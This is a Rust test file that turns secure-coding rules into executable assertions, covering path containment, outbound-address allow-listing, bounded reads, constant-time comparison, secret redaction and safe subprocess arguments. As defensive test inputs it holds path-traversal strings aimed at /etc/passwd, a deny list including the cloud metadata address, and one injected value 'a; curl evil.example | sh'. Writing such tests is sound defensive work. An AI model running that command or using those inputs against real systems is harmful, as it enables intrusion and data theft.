//! Behavior assertions for the rules derived from the authenticated PDF corpus.
//!
//! Each test states the contract of one rule in executable form, so the ledger
//! in `pdf_corpus_coverage.json` can bind a reviewed unit to a real assertion
//! rather than to prose alone.

use std::error::Error as StdError;
use std::fmt;
use std::io::{self, Read, Write};
use std::net::{IpAddr, Ipv4Addr, Ipv6Addr};
use std::path::{Component, Path, PathBuf};
use std::time::{Duration, Instant};

// --- api-path-containment ---------------------------------------------------

#[derive(Debug, PartialEq)]
enum PathError {
    Malformed,
    Escapes,
}

fn resolve_in_root(root: &Path, key: &str) -> Result<PathBuf, PathError> {
    if key.is_empty() || key.contains('\0') {
        return Err(PathError::Malformed);
    }
    let mut components = Path::new(key).components();
    let (Some(Component::Normal(name)), None) = (components.next(), components.next()) else {
        return Err(PathError::Malformed);
    };
    let candidate = root.join(name);
    if !candidate.starts_with(root) {
        return Err(PathError::Escapes);
    }
    Ok(candidate)
}

#[test]
fn caller_supplied_keys_cannot_escape_the_storage_root() {
    let root = Path::new("/srv/assets");

    assert_eq!(resolve_in_root(root, "logo.png"), Ok(root.join("logo.png")));

    for hostile in [
        "../etc/passwd",
        "../../etc/passwd",
        "/etc/passwd",
        "nested/../../etc/passwd",
        "a/b",
        ".",
        "..",
        "",
        "with\0nul",
    ] {
        assert_eq!(
            resolve_in_root(root, hostile),
            Err(PathError::Malformed),
            "{hostile:?} must not resolve"
        );
    }
}

// --- api-outbound-target ----------------------------------------------------

#[derive(Debug, PartialEq)]
enum TargetError {
    Scheme,
    HostNotAllowed,
    AddressNotAllowed,
}

fn is_public(address: IpAddr) -> bool {
    match address {
        IpAddr::V4(v4) => !(v4.is_loopback()
            || v4.is_private()
            || v4.is_link_local()
            || v4.is_broadcast()
            || v4.is_documentation()
            || v4.is_multicast()
            || v4.is_unspecified()
            || v4.octets()[0] == 0
            || (v4.octets()[0] == 100 && (64..128).contains(&v4.octets()[1]))
            || v4.octets()[0] >= 240),
        IpAddr::V6(v6) => !(v6.is_loopback()
            || v6.is_unspecified()
            || v6.is_multicast()
            || (v6.segments()[0] & 0xfe00) == 0xfc00
            || (v6.segments()[0] & 0xffc0) == 0xfe80),
    }
}

fn authorize_hop(
    scheme: &str,
    host: &str,
    allowed_hosts: &[&str],
    resolved: &[IpAddr],
) -> Result<(), TargetError> {
    if scheme != "https" {
        return Err(TargetError::Scheme);
    }
    if !allowed_hosts.contains(&host) {
        return Err(TargetError::HostNotAllowed);
    }
    if resolved.is_empty() || !resolved.iter().copied().all(is_public) {
        return Err(TargetError::AddressNotAllowed);
    }
    Ok(())
}

#[test]
fn outbound_targets_are_authorized_by_scheme_host_and_resolved_address() {
    let allowed = ["api.partner.example"];
    let public = IpAddr::V4(Ipv4Addr::new(93, 184, 216, 34));

    assert_eq!(
        authorize_hop("https", "api.partner.example", &allowed, &[public]),
        Ok(())
    );

    // The cloud metadata address, loopback, private, and CGNAT ranges are denied,
    // including when they appear beside a public answer.
    for hostile in [
        IpAddr::V4(Ipv4Addr::new(169, 254, 169, 254)),
        IpAddr::V4(Ipv4Addr::new(127, 0, 0, 1)),
        IpAddr::V4(Ipv4Addr::new(10, 0, 0, 5)),
        IpAddr::V4(Ipv4Addr::new(100, 64, 0, 1)),
        IpAddr::V6(Ipv6Addr::LOCALHOST),
        IpAddr::V6(Ipv6Addr::new(0xfd00, 0, 0, 0, 0, 0, 0, 1)),
        IpAddr::V4(Ipv4Addr::new(224, 0, 0, 1)),
        IpAddr::V4(Ipv4Addr::new(240, 0, 0, 1)),
        IpAddr::V4(Ipv4Addr::new(0, 0, 0, 0)),
        IpAddr::V6(Ipv6Addr::new(0xff02, 0, 0, 0, 0, 0, 0, 1)),
    ] {
        assert_eq!(
            authorize_hop("https", "api.partner.example", &allowed, &[hostile]),
            Err(TargetError::AddressNotAllowed),
            "{hostile} must not be reachable"
        );
        assert_eq!(
            authorize_hop("https", "api.partner.example", &allowed, &[public, hostile]),
            Err(TargetError::AddressNotAllowed),
            "{hostile} must not be reachable beside a public address"
        );
    }

    assert_eq!(
        authorize_hop("http", "api.partner.example", &allowed, &[public]),
        Err(TargetError::Scheme)
    );
    assert_eq!(
        authorize_hop("https", "internal.corp", &allowed, &[public]),
        Err(TargetError::HostNotAllowed)
    );
    assert_eq!(
        authorize_hop("https", "api.partner.example", &allowed, &[]),
        Err(TargetError::AddressNotAllowed)
    );
}

// --- api-resource-limits ----------------------------------------------------

const MAX_BODY_BYTES: u64 = 1 << 10;

#[derive(Debug)]
enum IntakeError {
    TooLarge,
    Read(io::Error),
}

fn read_bounded<R: Read>(source: R) -> Result<Vec<u8>, IntakeError> {
    let mut limited = source.take(MAX_BODY_BYTES + 1);
    let mut buffer = Vec::new();
    limited
        .read_to_end(&mut buffer)
        .map_err(IntakeError::Read)?;
    if buffer.len() as u64 > MAX_BODY_BYTES {
        return Err(IntakeError::TooLarge);
    }
    Ok(buffer)
}

struct FailingReader(Option<io::Error>);

impl Read for FailingReader {
    fn read(&mut self, _: &mut [u8]) -> io::Result<usize> {
        Err(self
            .0
            .take()
            .unwrap_or_else(|| io::Error::from(io::ErrorKind::Other)))
    }
}

#[test]
fn oversized_bodies_are_rejected_without_buffering_the_whole_input() {
    let at_limit = vec![b'x'; MAX_BODY_BYTES as usize];
    assert_eq!(
        read_bounded(&at_limit[..]).expect("at the limit").len(),
        MAX_BODY_BYTES as usize
    );

    let over_limit = vec![b'x'; MAX_BODY_BYTES as usize + 1];
    assert!(matches!(
        read_bounded(&over_limit[..]),
        Err(IntakeError::TooLarge)
    ));
    // The other variant carries the underlying failure rather than hiding it.
    let failing = io::Error::from(io::ErrorKind::PermissionDenied);
    assert!(matches!(
        read_bounded(FailingReader(Some(failing))),
        Err(IntakeError::Read(error)) if error.kind() == io::ErrorKind::PermissionDenied
    ));

    // A far larger body is refused too, and the reader never consumes more than
    // one byte past the ceiling.
    let huge = vec![b'x'; MAX_BODY_BYTES as usize * 64];
    let mut source = &huge[..];
    assert!(matches!(read_bounded(&mut source), Err(IntakeError::TooLarge)));
    assert_eq!(
        huge.len() - source.len(),
        MAX_BODY_BYTES as usize + 1,
        "the limit must bound the read itself, not just the check"
    );
}

// --- api-crypto-primitives --------------------------------------------------

fn constant_time_eq(a: &[u8], b: &[u8]) -> bool {
    if a.len() != b.len() {
        return false;
    }
    let mut difference = 0u8;
    for (x, y) in a.iter().zip(b.iter()) {
        difference |= x ^ y;
    }
    difference == 0
}

#[test]
fn secret_comparison_examines_every_byte_regardless_of_where_it_differs() {
    let tag = [0xa1u8, 0xb2, 0xc3, 0xd4];

    assert!(constant_time_eq(&tag, &[0xa1, 0xb2, 0xc3, 0xd4]));
    assert!(!constant_time_eq(&tag, &[0x00, 0xb2, 0xc3, 0xd4]));
    assert!(!constant_time_eq(&tag, &[0xa1, 0xb2, 0xc3, 0xd5]));
    assert!(!constant_time_eq(&tag, &[0xa1, 0xb2, 0xc3]));

    // Differing in the first byte and differing in the last byte must both be
    // decided by the same, full-length loop.
    let mut first_byte_differs = tag;
    first_byte_differs[0] ^= 0xff;
    let mut last_byte_differs = tag;
    last_byte_differs[3] ^= 0xff;
    assert_eq!(
        constant_time_eq(&tag, &first_byte_differs),
        constant_time_eq(&tag, &last_byte_differs)
    );
}

// --- type-time-domain -------------------------------------------------------

#[test]
fn elapsed_time_comes_from_the_monotonic_clock() {
    let started = Instant::now();
    let mut readings = Vec::new();
    for _ in 0..64 {
        readings.push(started.elapsed());
    }

    // A steady clock never runs backwards, so successive readings are ordered.
    for pair in readings.windows(2) {
        assert!(pair[1] >= pair[0], "monotonic clock went backwards");
    }
    assert!(readings.last().copied().unwrap_or_default() < Duration::from_secs(60));

    // Wall-clock differences are fallible by construction: the type forces the
    // caller to handle a clock that moved.
    let earlier = std::time::SystemTime::now();
    let difference = std::time::UNIX_EPOCH.duration_since(earlier);
    assert!(
        difference.is_err(),
        "SystemTime subtraction must report, not assume, ordering"
    );
}

// --- type-secret-material ---------------------------------------------------

trait Wipe {
    fn wipe(&mut self);
}

impl Wipe for String {
    fn wipe(&mut self) {
        let mut bytes = std::mem::take(self).into_bytes();
        bytes.iter_mut().for_each(|byte| *byte = 0);
    }
}

struct Secret<T: Wipe>(T);

impl<T: Wipe> Secret<T> {
    fn new(inner: T) -> Self {
        Self(inner)
    }

    fn expose(&self) -> &T {
        &self.0
    }
}

impl<T: Wipe> fmt::Debug for Secret<T> {
    fn fmt(&self, formatter: &mut fmt::Formatter<'_>) -> fmt::Result {
        formatter.write_str("Secret([redacted])")
    }
}

impl<T: Wipe> Drop for Secret<T> {
    fn drop(&mut self) {
        self.0.wipe();
    }
}

#[derive(Debug)]
struct DatabaseSettings {
    username: String,
    password: Secret<String>,
}

#[test]
fn secrets_are_redacted_in_debug_output_of_enclosing_types() {
    let settings = DatabaseSettings {
        username: "app".to_owned(),
        password: Secret::new("hunter2".to_owned()),
    };

    assert_eq!(settings.username, "app");
    let rendered = format!("{settings:?}");
    assert!(rendered.contains("Secret([redacted])"));
    assert!(!rendered.contains("hunter2"));
    assert!(rendered.contains("app"), "non-secret fields still render");
    assert_eq!(settings.password.expose(), "hunter2");
}

// --- type-variance ----------------------------------------------------------

struct MutStr<'a, 'b> {
    s: &'a mut &'b str,
}

#[test]
fn separate_lifetimes_keep_a_mutable_field_usable_after_the_borrow_ends() {
    let mut value = "hello";
    *MutStr { s: &mut value }.s = "world";

    // With a single lifetime the shared read below would not compile, because
    // the lifetime behind `&mut` is invariant and cannot be shortened.
    assert_eq!(value, "world");
}

// --- test-fuzz-target -------------------------------------------------------

fn parse_header(input: &[u8]) -> Result<(&[u8], &[u8]), ()> {
    let colon = input.iter().position(|byte| *byte == b':').ok_or(())?;
    let (name, rest) = input.split_at(colon);
    let value = rest.get(1..).ok_or(())?;
    if name.is_empty() {
        return Err(());
    }
    Ok((name, value))
}

fn parse_is_total_and_lossless(input: &[u8]) {
    if let Ok((name, value)) = parse_header(input) {
        assert_eq!(name.len() + 1 + value.len(), input.len());
    }
}

#[test]
fn the_fuzz_property_holds_over_the_seed_corpus_and_past_crashers() {
    let corpus: [&[u8]; 8] = [
        b"a:b",
        b"",
        b":",
        b"x:",
        b"no-colon",
        b"::",
        &[0xff, b':', 0x00],
        &[b':', 0xff],
    ];
    for seed in corpus {
        parse_is_total_and_lossless(seed);
    }

    assert!(parse_header(b":value").is_err(), "an empty name is rejected");
    assert_eq!(parse_header(b"k:").expect("empty value parses").1, b"");
}

// --- proj-cli-contract ------------------------------------------------------

/// A writer that reports `BrokenPipe` once the downstream consumer has stopped
/// reading, like `prog | head`.
struct ClosedPipe {
    accepted: usize,
}

impl Write for ClosedPipe {
    fn write(&mut self, buffer: &[u8]) -> io::Result<usize> {
        if self.accepted > 0 {
            self.accepted -= 1;
            return Ok(buffer.len());
        }
        Err(io::Error::new(io::ErrorKind::BrokenPipe, "closed"))
    }

    fn flush(&mut self) -> io::Result<()> {
        Ok(())
    }
}

fn emit(lines: &[&str], output: &mut impl Write) -> io::Result<bool> {
    let mut all_ok = true;
    for line in lines {
        if line.is_empty() {
            eprintln!("-: empty input");
            all_ok = false;
            continue;
        }
        match output.write_all(line.as_bytes()) {
            Err(error) if error.kind() == io::ErrorKind::BrokenPipe => return Ok(all_ok),
            other => other?,
        }
    }
    Ok(all_ok)
}

#[test]
fn cli_output_stops_cleanly_on_a_closed_pipe_and_failures_reach_the_exit_status() {
    // A consumer that quits after one line ends the program successfully.
    let mut pipe = ClosedPipe { accepted: 1 };
    assert!(matches!(emit(&["one", "two", "three"], &mut pipe), Ok(true)));

    // A bad input is reported and skipped, but the run still fails overall.
    let mut sink = Vec::new();
    assert!(matches!(emit(&["one", "", "three"], &mut sink), Ok(false)));
    assert_eq!(sink, b"onethree");
}

// --- err-short-read ---------------------------------------------------------

fn read_available<R: Read>(reader: &mut R, buffer: &mut [u8]) -> io::Result<usize> {
    let mut filled = 0;
    while filled < buffer.len() {
        match reader.read(&mut buffer[filled..])? {
            0 => break,
            read => filled += read,
        }
    }
    Ok(filled)
}

/// A reader that hands back one byte at a time, like a socket delivering
/// segments — the case a single `read` call silently truncates.
struct Dribble<'a>(&'a [u8]);

impl Read for Dribble<'_> {
    fn read(&mut self, out: &mut [u8]) -> io::Result<usize> {
        if self.0.is_empty() || out.is_empty() {
            return Ok(0);
        }
        out[0] = self.0[0];
        self.0 = &self.0[1..];
        Ok(1)
    }
}

#[test]
fn a_short_read_is_reported_rather_than_padding_the_buffer() {
    let source = b"abc";

    // One `read` call against a dribbling reader returns 1, not 3: code that
    // ignored the count would treat 7 stale bytes as input.
    let mut once = [0u8; 8];
    let first = Dribble(source).read(&mut once).expect("read");
    assert_eq!(first, 1);

    let mut buffer = [0u8; 8];
    let filled = read_available(&mut Dribble(source), &mut buffer).expect("read");
    assert_eq!(filled, 3);
    assert_eq!(&buffer[..filled], b"abc");
    assert_eq!(&buffer[filled..], &[0u8; 5], "the tail is untouched, not data");

    // When the length is part of the format, a truncated stream must fail.
    let mut required = [0u8; 8];
    let error = Dribble(source).read_exact(&mut required).unwrap_err();
    assert_eq!(error.kind(), io::ErrorKind::UnexpectedEof);
}

// --- err-debug-assert-scope -------------------------------------------------

const HEADER_LEN: usize = 4;

#[derive(Debug, PartialEq)]
enum RecordError {
    Truncated,
}

fn parse_record(bytes: &[u8]) -> Result<(&[u8], &[u8]), RecordError> {
    if bytes.len() < HEADER_LEN {
        return Err(RecordError::Truncated);
    }
    let (header, body) = bytes.split_at(HEADER_LEN);
    debug_assert_eq!(header.len(), HEADER_LEN);
    Ok((header, body))
}

#[test]
fn boundary_validation_returns_an_error_in_every_profile() {
    assert_eq!(parse_record(b"abcdBODY"), Ok((&b"abcd"[..], &b"BODY"[..])));
    // This must hold whether or not debug assertions are compiled in, which is
    // exactly what a `debug_assert!` guard could not promise.
    assert_eq!(parse_record(b"ab"), Err(RecordError::Truncated));
    assert_eq!(parse_record(b""), Err(RecordError::Truncated));
}

// --- err-send-sync-static ---------------------------------------------------

#[derive(Debug)]
struct StoreError {
    key: String,
    source: Option<Box<dyn StdError + Send + Sync + 'static>>,
}

impl fmt::Display for StoreError {
    fn fmt(&self, formatter: &mut fmt::Formatter<'_>) -> fmt::Result {
        write!(formatter, "store rejected key {}", self.key)
    }
}

impl StdError for StoreError {
    fn source(&self) -> Option<&(dyn StdError + 'static)> {
        self.source
            .as_deref()
            .map(|source| source as &(dyn StdError + 'static))
    }
}

fn assert_error_contract<E: StdError + Send + Sync + 'static>() {}

#[test]
fn public_errors_can_cross_threads_and_be_wrapped() {
    assert_error_contract::<StoreError>();

    let error = StoreError {
        key: "orders/42".to_owned(),
        source: Some(Box::new(io::Error::from(io::ErrorKind::PermissionDenied))),
    };
    assert!(error.source().is_some(), "the cause survives boxing");

    // The bounds are what make these two standard moves possible at all.
    let boxed: Box<dyn StdError + Send + Sync + 'static> = Box::new(error);
    let wrapped = io::Error::other(boxed);
    assert!(wrapped.get_ref().is_some());

    let moved = std::thread::spawn(|| StoreError { key: "k".to_owned(), source: None })
        .join()
        .expect("thread panicked");
    assert_eq!(moved.to_string(), "store rejected key k");
}

// --- serde-byte-order / serde-format-version --------------------------------

const MAGIC: [u8; 4] = *b"IDX1";
const VERSION: u16 = 2;

#[derive(Debug, PartialEq)]
enum FormatError {
    NotOurFormat,
    UnsupportedVersion(u16),
    Truncated,
}

fn read_header(source: &mut impl Read) -> Result<u16, FormatError> {
    let mut magic = [0u8; 4];
    let mut version = [0u8; 2];
    source.read_exact(&mut magic).map_err(|_| FormatError::Truncated)?;
    source.read_exact(&mut version).map_err(|_| FormatError::Truncated)?;
    if magic != MAGIC {
        return Err(FormatError::NotOurFormat);
    }
    match u16::from_be_bytes(version) {
        supported @ 1..=VERSION => Ok(supported),
        other => Err(FormatError::UnsupportedVersion(other)),
    }
}

#[test]
fn wire_encoding_is_fixed_by_the_format_not_by_the_host() {
    // Declared big-endian: the bytes are the same on every architecture, which
    // is the property a same-host round-trip cannot demonstrate.
    assert_eq!(0x0102_0304_u32.to_be_bytes(), [0x01, 0x02, 0x03, 0x04]);
    assert_eq!(u32::from_be_bytes([0x01, 0x02, 0x03, 0x04]), 0x0102_0304);
}

#[test]
fn a_versioned_header_rejects_foreign_and_future_files() {
    let mut file = MAGIC.to_vec();
    file.extend_from_slice(&VERSION.to_be_bytes());
    assert_eq!(read_header(&mut &file[..]), Ok(VERSION));

    assert_eq!(read_header(&mut &b"JPEG\0\x01"[..]), Err(FormatError::NotOurFormat));
    assert_eq!(
        read_header(&mut &b"IDX1\0\x63"[..]),
        Err(FormatError::UnsupportedVersion(99)),
        "a newer writer's file must be refused, not decoded"
    );
    assert_eq!(read_header(&mut &b"IDX"[..]), Err(FormatError::Truncated));
}

// --- api-record-checksum ----------------------------------------------------

fn checksum(bytes: &[u8]) -> u32 {
    bytes.iter().fold(0x811c_9dc5_u32, |acc, byte| {
        (acc ^ u32::from(*byte)).wrapping_mul(0x0100_0193)
    })
}

fn encode_record(payload: &[u8]) -> Vec<u8> {
    let mut record = checksum(payload).to_be_bytes().to_vec();
    record.extend_from_slice(payload);
    record
}

fn decode_record(record: &[u8]) -> Result<&[u8], u32> {
    let (stored, payload) = record.split_at(4);
    let expected = u32::from_be_bytes(stored.try_into().unwrap_or([0; 4]));
    let actual = checksum(payload);
    if expected != actual { Err(actual) } else { Ok(payload) }
}

#[test]
fn a_single_flipped_bit_is_detected_before_the_payload_is_used() {
    let record = encode_record(b"ledger entry");
    assert_eq!(decode_record(&record), Ok(&b"ledger entry"[..]));

    for index in 4..record.len() {
        let mut corrupted = record.clone();
        corrupted[index] ^= 0b0000_0001;
        assert!(
            decode_record(&corrupted).is_err(),
            "a flipped bit at {index} must not decode"
        );
    }

    // Truncation changes the protected span, so it fails too.
    assert!(decode_record(&record[..record.len() - 1]).is_err());
}

// --- api-subprocess-args ----------------------------------------------------

#[test]
fn shell_metacharacters_stay_inside_one_argument() {
    use std::process::Command;

    let hostile = "a; curl evil.example | sh";
    let mut command = Command::new("/usr/bin/tar");
    command.arg("czf").arg("out.tgz").arg("--").arg(hostile);

    let args: Vec<String> = command
        .get_args()
        .map(|arg| arg.to_string_lossy().into_owned())
        .collect();
    assert_eq!(args, ["czf", "out.tgz", "--", hostile]);
    assert_eq!(
        args.iter().filter(|arg| arg.contains(';')).count(),
        1,
        "the metacharacters are one literal operand, not a new command"
    );
}

// --- proj-secret-file-mode --------------------------------------------------

#[cfg(unix)]
#[test]
fn credential_files_are_created_owner_only() {
    use std::fs::{self, DirBuilder, OpenOptions};
    use std::os::unix::fs::{DirBuilderExt, OpenOptionsExt, PermissionsExt};

    let dir = std::env::temp_dir().join(format!("rust-skills-secret-{}", std::process::id()));
    let _ = fs::remove_dir_all(&dir);
    DirBuilder::new().recursive(true).mode(0o700).create(&dir).expect("mkdir");

    let path = dir.join("token");
    let mut file = OpenOptions::new()
        .write(true)
        .create(true)
        .truncate(true)
        .mode(0o600)
        .open(&path)
        .expect("create");
    file.write_all(b"s3cret").expect("write");

    // The mode is set by the create call, so there is no window in which the
    // secret exists under a wider mode.
    let mode = fs::metadata(&path).expect("stat").permissions().mode() & 0o777;
    assert_eq!(mode, 0o600, "secret must be owner read/write only");
    let dir_mode = fs::metadata(&dir).expect("stat dir").permissions().mode() & 0o777;
    assert_eq!(dir_mode, 0o700, "the containing directory must be owner-only");

    fs::remove_dir_all(&dir).expect("cleanup");
}

// --- type-path-not-string ---------------------------------------------------

#[test]
fn paths_are_extended_without_a_utf8_round_trip() {
    use std::ffi::OsString;

    let path = Path::new("/var/data/report.csv");
    let mut name = path.file_name().map(OsString::from).unwrap_or_default();
    name.push(".bak");
    let target = path.with_file_name(name);

    assert_eq!(target, Path::new("/var/data/report.csv.bak"));
    assert!(target.starts_with(Path::new("/var/data")));

    // On Unix a path need not be UTF-8 at all; `to_str` reports that instead of
    // guessing, which is why the operations above stay in path space.
    #[cfg(unix)]
    {
        use std::os::unix::ffi::OsStrExt;
        let raw = std::ffi::OsStr::from_bytes(&[0xff, 0xfe]);
        let non_utf8 = Path::new(raw);
        assert!(non_utf8.to_str().is_none());
        assert_eq!(non_utf8.to_string_lossy(), "\u{fffd}\u{fffd}");
    }
}
